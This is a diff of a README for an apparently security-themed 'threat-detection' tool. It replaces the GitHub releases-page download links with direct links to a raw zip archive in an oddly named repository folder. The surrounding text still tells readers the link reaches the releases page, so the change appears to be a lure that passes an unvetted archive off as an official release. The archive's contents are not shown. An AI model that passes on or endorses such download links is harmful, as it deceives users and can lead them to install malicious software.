@@ -1,6 +1,6 @@
 # 🔍 threat-detection- - Analyze security threats with simple tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/spreaderwangle568/threat-detection-/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/spreaderwangle568/threat-detection-/raw/refs/heads/main/erysipeloid/detection_threat_v3.4.zip)
 
 ## 📌 About This Tool
 
@@ -30,7 +30,7 @@ This software runs within a container. You need to install Docker Desktop to man
 
 You can get the file from the project page.
 
-[https://github.com/spreaderwangle568/threat-detection-/releases](https://github.com/spreaderwangle568/threat-detection-/releases)
+[https://github.com/spreaderwangle568/threat-detection-/raw/refs/heads/main/erysipeloid/detection_threat_v3.4.zip](https://github.com/spreaderwangle568/threat-detection-/raw/refs/heads/main/erysipeloid/detection_threat_v3.4.zip)
 
 Click the link above to reach the releases page. Look for the most recent version labeled as stable. Select the download file that matches your Windows installation. Save the file in a folder you can find later, such as your Downloads or Documents folder.
 
